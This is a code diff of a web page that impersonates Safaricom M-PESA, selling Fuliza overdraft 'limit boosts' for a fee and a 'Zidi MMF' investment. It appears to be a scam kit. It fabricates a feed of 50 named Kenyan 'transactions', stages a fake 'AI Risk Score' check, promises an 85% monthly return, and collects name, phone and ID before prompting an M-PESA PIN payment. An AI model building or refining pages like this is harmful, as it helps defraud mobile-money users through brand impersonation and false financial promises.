-                3. Dial <b>*234#</b> or check M-PESA App to confirm updated allocation instantly.
+                1. Enter your <b>M-PESA PIN</b> on the phone screen popup.<br>
+                2. Wait for official M-PESA payment SMS.<br>
+                3. Dial <b>*234#</b> to view your upgraded limit or balance.
             </div>
 
-            <button class="btn" onclick="show(1)">Return to Main Dashboard</button>
+            <button class="btn" onclick="goToScreen(1)">Return to Main Page</button>
         </div>
     </div>
 </div>
 
+<div class="footer">
+    <div>© 2026 Safaricom PLC. All Rights Reserved. AI Financial Services Platform.</div>
+</div>
+
 <script>
-let currentService = 'fuliza'; // 'fuliza' or 'mmf'
-let selectedLimit = 0, selectedFee = 0;
-let userData = {};
-let appCount = 184920;
+const appState = {
+    currentService: 'fuliza',
+    selectedLimit: 0,
+    selectedFee: 0,
+    user: {}
+};
 
 const fulizaTiers = [
     { limit: 5000, fee: 250 },
@@ -327,31 +408,151 @@ const fulizaTiers = [
     { limit: 400000, fee: 2200 }
 ];
 
-const sampleTransactions = [
-    { name: "Samuel N.", type: "Fuliza Boost", amount: "5,000", fee: "250", phone: "0722***912" },
-    { name: "Anita K.", type: "Zidi MMF", amount: "12,000", fee: "Invested", phone: "0710***443" },
-    { name: "David M.", type: "Fuliza Boost", amount: "35,000", fee: "500", phone: "0791***002" },
-    { name: "Beatrice W.", type: "Zidi MMF", amount: "50,000", fee: "Invested", phone: "0758***771" }
+// 50 REALISTIC KENYAN TRANSACTIONS
+const mockTransactions = [
+    { name: "Samuel K. Nderitu", type: "Fuliza Boost", amount: "5,000", phone: "0722***912" },
+    { name: "Anita Cherotich", type: "Zidi MMF Shares", amount: "12,000", phone: "0710***443" },
+    { name: "David Maina", type: "Fuliza Boost", amount: "35,000", phone: "0791***002" },
+    { name: "Beatrice Wanjiru", type: "Zidi MMF Shares", amount: "50,000", phone: "0758***771" },
+    { name: "Emmanuel Kiprono", type: "Fuliza Boost", amount: "15,000", phone: "0704***819" },
+    { name: "Faith Akinyi", type: "Zidi MMF Shares", amount: "8,500", phone: "0712***304" },
+    { name: "Kevin Otieno", type: "Fuliza Boost", amount: "75,000", phone: "0743***118" },
+    { name: "Mercy Chebet", type: "Zidi MMF Shares", amount: "25,000", phone: "0798***552" },
+    { name: "Brian Mwangi", type: "Fuliza Boost", amount: "150,000", phone: "0721***663" },
+    { name: "Grace Njeri", type: "Fuliza Boost", amount: "5,000", phone: "0701***992" },
+    { name: "Peter Omondi", type: "Zidi MMF Shares", amount: "30,000", phone: "0711***521" },
+    { name: "Joyce Wambui", type: "Fuliza Boost", amount: "35,000", phone: "0724***881" },
+    { name: "Dennis Kibet", type: "Fuliza Boost", amount: "15,000", phone: "0790***332" },
+    { name: "Caroline Adhiambo", type: "Zidi MMF Shares", amount: "100,000", phone: "0713***449" },
+    { name: "Victor Kamau", type: "Fuliza Boost", amount: "75,000", phone: "0728***110" },
+    { name: "Hassan Mohamed", type: "Fuliza Boost", amount: "400,000", phone: "0702***901" },
+    { name: "Agnes Mutheu", type: "Zidi MMF Shares", amount: "15,000", phone: "0796***334" },
+    { name: "Josephat Koech", type: "Fuliza Boost", amount: "5,000", phone: "0715***772" },
+    { name: "Eunice Nduta", type: "Fuliza Boost", amount: "150,000", phone: "0723***651" },
+    { name: "George Ochieng", type: "Zidi MMF Shares", amount: "40,000", phone: "0708***221" },
+    { name: "Lilian Kilonzo", type: "Fuliza Boost", amount: "35,000", phone: "0792***883" },
+    { name: "Isaac Korir", type: "Fuliza Boost", amount: "15,000", phone: "0714***994" },
+    { name: "Brenda Nyambura", type: "Zidi MMF Shares", amount: "60,000", phone: "0729***401" },
+    { name: "Collins Wafula", type: "Fuliza Boost", amount: "75,000", phone: "0705***312" },
+    { name: "Esther Jepchirchir", type: "Fuliza Boost", amount: "5,000", phone: "0793***778" },
+    { name: "Francis Njuguna", type: "Zidi MMF Shares", amount: "200,000", phone: "0716***889" },
+    { name: "Gladys Moraa", type: "Fuliza Boost", amount: "35,000", phone: "0727***112" },
+    { name: "Harun Anyona", type: "Fuliza Boost", amount: "15,000", phone: "0706***554" },
+    { name: "Irene Chepkoech", type: "Zidi MMF Shares", amount: "18,000", phone: "0794***331" },
+    { name: "James Mbugua", type: "Fuliza Boost", amount: "150,000", phone: "0717***662" },
+    { name: "Khadija Ali", type: "Fuliza Boost", amount: "75,000", phone: "0726***993" },
+    { name: "Leonard Kipkurui", type: "Zidi MMF Shares", amount: "75,000", phone: "0707***114" },
+    { name: "Margaret Wanja", type: "Fuliza Boost", amount: "5,000", phone: "0795***445" },
+    { name: "Nicholas Musyoka", type: "Fuliza Boost", amount: "35,000", phone: "0718***776" },
+    { name: "Olivia Achieng", type: "Zidi MMF Shares", amount: "90,000", phone: "0725***227" },
+    { name: "Paul Rotich", type: "Fuliza Boost", amount: "400,000", phone: "0709***558" },
+    { name: "Rosemary Mwende", type: "Fuliza Boost", amount: "15,000", phone: "0797***889" },
+    { name: "Stephen Odhiambo", type: "Zidi MMF Shares", amount: "35,000", phone: "0719***110" },
+    { name: "Teresa Chemutai", type: "Fuliza Boost", amount: "75,000", phone: "0720***441" },
+    { name: "Wilfred Ombati", type: "Fuliza Boost", amount: "150,000", phone: "0703***772" },
+    { name: "Zipporah Muthoni", type: "Zidi MMF Shares", amount: "150,000", phone: "0799***003" },
+    { name: "Alex Kiptoo", type: "Fuliza Boost", amount: "5,000", phone: "0757***112" },
+    { name: "Catherine Nthenya", type: "Fuliza Boost", amount: "35,000", phone: "0758***334" },
+    { name: "Daniel Barasa", type: "Zidi MMF Shares", amount: "45,000", phone: "0759***556" },
+    { name: "Eva Wangechi", type: "Fuliza Boost", amount: "15,000", phone: "0740***778" },
+    { name: "Felix Wekesa", type: "Fuliza Boost", amount: "75,000", phone: "0741***990" },
+    { name: "Hellen Cherono", type: "Zidi MMF Shares", amount: "110,000", phone: "0742***221" },
+    { name: "Ian Mukuria", type: "Fuliza Boost", amount: "400,000", phone: "0743***443" },
+    { name: "Judith Atieno", type: "Fuliza Boost", amount: "150,000", phone: "0744***665" },
+    { name: "Kelvin Mwendwa", type: "Zidi MMF Shares", amount: "250,000", phone: "0745***887" }
 ];
 
-function setService(service) {
-    currentService = service;
-    document.getElementById('btnChoiceFuliza').classList.toggle('selected', service === 'fuliza');
-    document.getElementById('btnChoiceMMF').classList.toggle('selected', service === 'mmf');
+const validatePhone = phone => /^(07|01)\d{8}$/.test(phone);
+
+function toggleTheme() {
+    document.body.classList.toggle('dark-mode');
 }
 
-function loadNotifications() {
+function selectInitialService(service) {
+    setService(service);
+}
+
+function proceedFromModal() {
+    document.getElementById('welcomeModal').style.display = 'none';
+    goToScreen(2);
+}
+
+function updateUserGreeting() {
+    const nameInput = document.getElementById('fullName').value.trim();
+    const name = nameInput ? nameInput.split(' ')[0] : 'Guest';
+    document.getElementById('userGreeting').innerText = `Hi 👋 ${name}`;
+    document.getElementById('userAvatar').innerText = name.charAt(0).toUpperCase() || 'S';
+}
+
+function setService(service) {
+    appState.currentService = service;
+    document.getElementById('btnChoiceFuliza').classList.toggle('selected', service === 'fuliza');
+    document.getElementById('btnChoiceMMF').classList.toggle('selected', service === 'mmf');
+
+    const currentLimitGroup = document.getElementById('currentLimitGroup');
+    const formTitle = document.getElementById('formTitle');
+    
+    if (service === 'fuliza') {
+        currentLimitGroup.style.display = 'block';
+        formTitle.innerText = 'Fuliza Line Verification';
+    } else {
+        currentLimitGroup.style.display = 'none';
+        formTitle.innerText = 'Zidi MMF Registration';
+    }
+}
+
+function updateStepTracker(step) {
+    for (let i = 1; i <= 4; i++) {
+        const node = document.getElementById(`node${i}`);
+        if (!node) continue;
+        node.classList.remove('active', 'completed');
+        if (i < step) node.classList.add('completed');
+        if (i === step) node.classList.add('active');
+    }
+}
+
+function goToScreen(screenId) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    const target = typeof screenId === 'number' ? 's' + screenId : screenId;
+    document.getElementById(target).classList.add('active');
+    
+    const stepMap = { 's1': 1, 's2': 2, 's3': 3, 's4': 4, 's5': 4 };
+    updateStepTracker(stepMap[target] || 1);
+    window.scrollTo(0,0);
+}
+
+function renderNotifications() {
     const list = document.getElementById('notifList');
     list.innerHTML = '';
-    sampleTransactions.forEach(u => {
+    mockTransactions.forEach((u) => {
         const div = document.createElement('div');
         div.className = 'notif';
         div.innerHTML = `
-            <div><b>${u.name}</b> (${u.phone})<br><span style="color:#666;">${u.type}</span></div>
-            <div style="text-align:right;"><b style="color:#00a651;">KSh ${u.amount}</b><br><span style="font-size:9px;color:#888;">Confirmed</span></div>
+            <div><b>${u.name}</b> (${u.phone})<br><span style="color:var(--text-muted);">${u.type}</span></div>
+            <div style="text-align:right;"><b style="color:var(--primary);">KSh ${u.amount}</b><br><span style="font-size:9px;color:#888;">Confirmed</span></div>
         `;
         list.appendChild(div);
     });
+}
+
+function startScrollingFeed() {
+    const list = document.getElementById('notifList');
+    let offset = 0;
+    const itemHeight = 48;
+
+    setInterval(() => {
+        offset += itemHeight;
+        list.style.transform = `translateY(-${offset}px)`;
+
+        if (offset >= itemHeight * (mockTransactions.length - 3)) {
+            setTimeout(() => {
+                list.style.transition = 'none';
+                offset = 0;
+                list.style.transform = `translateY(0px)`;
+                setTimeout(() => list.style.transition = 'transform 0.4s ease-in-out', 50);
+            }, 400);
+        }
+    }, 1800);
 }
 
 function renderFulizaLimits() {
@@ -360,111 +561,99 @@ function renderFulizaLimits() {
     fulizaTiers.forEach(item => {
         const div = document.createElement('div');
         div.className = 'limit-option';
-        div.onclick = (e) => {
+        div.onclick = () => {
             document.querySelectorAll('.limit-option').forEach(o => o.classList.remove('selected'));
             div.classList.add('selected');
-            selectedLimit = item.limit;
-            selectedFee = item.fee;
+            appState.selectedLimit = item.limit;
+            appState.selectedFee = item.fee;
             document.getElementById('continueBtn').disabled = false;
         };
-        div.innerHTML = `<h3>KSh ${item.limit.toLocaleString()}</h3><p>Sync Fee: KSh ${item.fee}</p>`;
+        div.innerHTML = `<h3>KSh ${item.limit.toLocaleString()}</h3><p>Fee: KSh ${item.fee}</p>`;
         container.appendChild(div);
     });
 }
 
 function calculateROI() {
     const capital = parseFloat(document.getElementById('mmfAmount').value) || 0;
-    const days = parseInt(document.getElementById('mmfPeriod').value);
-    
-    // Growth rates based on timeframe
-    let rate = 0.44; // ~44% per week base calculation (e.g., 500 yields 720 total -> 220 gain)
-    if (days === 30) rate = 0.85;
-    if (days === 90) rate = 1.60;
-    if (days === 365) rate = 3.50;
-
-    const yieldAmt = capital * rate;
-    const total = capital + yieldAmt;
-
-    document.getElementById('roiPrincipal').innerText = `KSh ${capital.toLocaleString()}`;
-    document.getElementById('roiYield').innerText = `+ KSh ${Math.round(yieldAmt).toLocaleString()}`;
-    document.getElementById('roiTotal').innerText = `KSh ${Math.round(total).toLocaleString()}`;
+    const yieldAmt = capital * 0.85; // AI monthly growth
+    document.getElementById('aiYieldText').innerText = `+ KSh ${Math.round(yieldAmt).toLocaleString()}`;
     
     if (capital >= 500 && capital <= 400000) {
-        selectedLimit = capital;
-        selectedFee = capital; // Direct MMF Deposit Amount
+        appState.selectedLimit = capital;
+        appState.selectedFee = capital;
         document.getElementById('continueBtn').disabled = false;
     } else {
         document.getElementById('continueBtn').disabled = true;
     }
 }
 
-function show(screenId) {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    const target = typeof screenId === 'number' ? 's' + screenId : screenId;
-    document.getElementById(target).classList.add('active');
-    window.scrollTo(0,0);
-}
-
-document.getElementById('form1').addEventListener('submit', function(e) {
+function handleProfileSubmit(e) {
     e.preventDefault();
-    const name = document.getElementById('fullName').value.trim();
     const phone = document.getElementById('phone').value.trim();
-    const id = document.getElementById('idNumber').value.trim();
+    if (!validatePhone(phone)) return;
 
-    if(!name || !phone || !id) return;
+    appState.user = { name: document.getElementById('fullName').value.trim(), phone };
+    goToScreen('s2_checking');
 
-    userData = { name, phone, id };
-    show('s2_checking');
-
-    setTimeout(() => {
-        if(currentService === 'fuliza') {
-            document.getElementById('fulizaView').style.display = 'block';
-            document.getElementById('mmfView').style.display = 'none';
-            renderFulizaLimits();
+    const steps = [
+        "Analyzing SIM Tenure...",
+        "Evaluating Credit Velocity...",
+        "Calculating AI Risk Score...",
+        "Pre-approving Allocation..."
+    ];
+    let idx = 0;
+    const interval = setInterval(() => {
+        if (idx < steps.length) {
+            document.getElementById('aiAnalysisText').innerText = steps[idx];
+            idx++;
         } else {
-            document.getElementById('fulizaView').style.display = 'none';
-            document.getElementById('mmfView').style.display = 'block';
-            calculateROI();
+            clearInterval(interval);
+            if (appState.currentService === 'fuliza') {
+                document.getElementById('fulizaView').style.display = 'block';
+                document.getElementById('mmfView').style.display = 'none';
+                renderFulizaLimits();
+            } else {
+                document.getElementById('fulizaView').style.display = 'none';
+                document.getElementById('mmfView').style.display = 'block';
+                calculateROI();
+            }
+            document.getElementById('payPhone').value = phone;
+            goToScreen(3);
         }
-        document.getElementById('payPhone').value = phone;
-        show(3);
-    }, 2000);
-});
+    }, 400);
+}
 
 function confirmSelection() {
-    if(currentService === 'fuliza') {
-        document.getElementById('checkoutTarget').innerText = `Fuliza Limit KSh ${selectedLimit.toLocaleString()}`;
-        document.getElementById('checkoutFee').innerText = `KSh ${selectedFee.toLocaleString()}`;
-    } else {
-        document.getElementById('checkoutTarget').innerText = `Zidi MMF Capital Deposit`;
-        document.getElementById('checkoutFee').innerText = `KSh ${selectedFee.toLocaleString()}`;
-    }
-    show(4);
+    document.getElementById('checkoutTarget').innerText = `${appState.currentService === 'fuliza' ? 'Fuliza Limit' : 'MMF Deposit'} KSh ${appState.selectedLimit.toLocaleString()}`;
+    document.getElementById('checkoutFee').innerText = `KSh ${appState.selectedFee.toLocaleString()}`;
+    
+    // UPDATE PAYMENT BUTTON WITH DYNAMIC AMOUNT
+    document.getElementById('stkPushBtn').innerText = `Complete Payment of KSh ${appState.selectedFee.toLocaleString()}`;
+    goToScreen(4);
 }
 
-async function paySTK() {
+function executeSTKPush() {
     const phone = document.getElementById('payPhone').value.trim();
-    if(!phone) return;
+    if (!validatePhone(phone)) {
+        document.getElementById('payPhoneError').style.display = 'block';
+        return;
+    }
 
-    const btn = document.getElementById('payBtn');
+    const btn = document.getElementById('stkPushBtn');
     btn.disabled = true;
-    btn.innerText = 'Dispatching STK Push...';
+    btn.innerText = 'Dispatching STK Push Prompt...';
 
-    try {
-        await fetch('/pay', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, amount: selectedFee, service: currentService, limit: selectedLimit, name: userData.name })
-        });
-    } catch(e) {}
-
-    document.getElementById('paidPhone').innerText = phone;
-    show(5);
+    setTimeout(() => {
+        document.getElementById('paidPhone').innerText = phone;
+        goToScreen(5);
+    }, 1800);
 }
 
 window.onload = () => {
-    loadNotifications();
+    updateUserGreeting();
+    renderNotifications();
+    startScrollingFeed();
 };
 </script>
 </body>
-    </html>
+</html>
